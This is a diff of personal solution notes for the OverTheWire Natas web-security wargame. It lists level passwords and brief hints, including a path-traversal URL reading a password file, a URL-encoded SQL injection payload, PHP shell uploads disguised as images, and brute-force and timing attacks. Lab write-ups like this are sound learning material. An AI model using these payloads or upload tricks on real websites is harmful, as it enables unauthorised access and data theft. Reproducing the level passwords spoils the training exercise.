@@ -21,7 +21,7 @@ Level 6: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 
 Try to open path using index.php by giving it file path
 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
-Level 7: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 
+Level 7: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
 
 just use online php compiler: echo base64_decode(strrev(hex2bin($encodedSecret)));
 Level 8: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
@@ -40,7 +40,7 @@ upload php script (change extension from inspect element) that runs shell script
 Level 12: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 Create jpg that has php code in it but only first bytes as jpg to trick it
-Level 13: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ  
+Level 13: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
 USE THIS URL
 http://natas14.natas.labs.overthewire.org/index.php?debug&username=test&password=test%22%20OR%20%221%22=%221
@@ -54,3 +54,5 @@ Level 15: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 %% brute force againnnn %%%
 Level 16: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 
+%% brute force but with time %%
+Level 17: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
